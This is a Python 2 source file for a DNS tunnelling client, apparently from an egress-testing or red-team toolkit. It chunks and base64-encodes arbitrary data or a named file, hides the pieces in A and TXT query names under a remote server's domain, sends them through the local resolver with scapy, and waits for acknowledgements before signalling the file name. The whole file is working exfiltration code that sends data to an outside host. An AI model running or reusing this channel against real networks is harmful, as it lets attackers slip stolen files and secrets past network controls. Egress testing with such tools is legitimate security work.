'''

This is a DNS client that transmits data within A record requests
Thanks to Raffi for his awesome blog posts on how this can be done
http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/

'''

import base64
import dns.resolver
import socket
import sys
from common import helpers
from scapy.all import *


class Client:

    def __init__(self, cli_object):
        self.protocol = "dns_resolved"
        self.remote_server = cli_object.ip
        self.max_length = 68
        self.current_total = 0
        if cli_object.file is None:
            self.file_transfer = False
            self.length = 50
        else:
            self.length = 24
            if "/" in cli_object.file:
                self.file_transfer = cli_object.file.split("/")[-1]
            else:
                self.file_transfer = cli_object.file

    def transmit(self, data_to_transmit):

        byte_reader = 0
        check_total = False
        packet_number = 1

        resolver_object = dns.resolver.get_default_resolver()
        nameserver = resolver_object.nameservers[0]

        while (byte_reader < len(data_to_transmit) + self.length):
            if not self.file_transfer:
                encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
                encoded_data = encoded_data.replace("=", ".---")

                # calcalate total packets
                if ((len(data_to_transmit) % self.length) == 0):
                    total_packets = len(data_to_transmit) / self.length
                else:
                    total_packets = (len(data_to_transmit) / self.length) + 1

                print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)

                # Craft the packet with scapy
                try:
                    request_packet = IP(dst=nameserver)/UDP()/DNS(
                        rd=1, qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
                    send(request_packet, iface='eth0', verbose=False)
                except socket.gaierror:
                    pass
                except KeyboardInterrupt:
                    print "[*] Shutting down..."
                    sys.exit()
            else:
                encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
                encoded_data = encoded_data + "." + self.remote_server

                # calcalate total packets
                if (((len(data_to_transmit) - byte_reader) % self.length) == 0):
                    packet_diff = (len(data_to_transmit) - byte_reader) / self.length
                else:
                    packet_diff = ((len(data_to_transmit) - byte_reader) / self.length)

                while len(encoded_data) > self.max_length:

                    self.length -= 1
                    # calcalate total packets
                    if (((len(data_to_transmit) - byte_reader) % self.length) == 0):
                        packet_diff2 = (len(data_to_transmit) - byte_reader) / self.length
                    else:
                        packet_diff2 = ((len(data_to_transmit) - byte_reader) / self.length)
                    check_total = True
                    encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
                    encoded_data = encoded_data + "." + self.remote_server

                if check_total:
                    self.current_total = packet_number + packet_diff2
                    check_total = False

                else:
                    if self.current_total == 0:
                        self.current_total = packet_diff
                    else:
                        pass

                print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)

                # Craft the packet with scapy
                try:
                    while True:

                        if '=' in encoded_data:
                            encoded_data = encoded_data.replace('=', '-pqp-')

                        response_packet = sr1(IP(dst=nameserver, ttl=10)/UDP()/DNS(
                            rd=1, id=15, opcode=0,
                            qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
                            verbose=False, timeout=8)

                        if response_packet:
                            if response_packet.haslayer(DNSRR):
                                dnsrr_strings = repr(response_packet[DNSRR])
                                if str(packet_number) + "allgoodhere" in dnsrr_strings:
                                    break

                except KeyboardInterrupt:
                    print "You just rage quit!"
                    sys.exit()

                # Increment counters
                byte_reader += self.length
                packet_number += 1

        if self.file_transfer is not False:

            while True:
                final_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
                    id=15, opcode=0,
                    qd=[DNSQR(qname="file---" + self.file_transfer + "." + self.remote_server, qtype="TXT")], aa=1, qr=0),
                    verbose=True, timeout=2)

                if final_packet:
                    break

        return
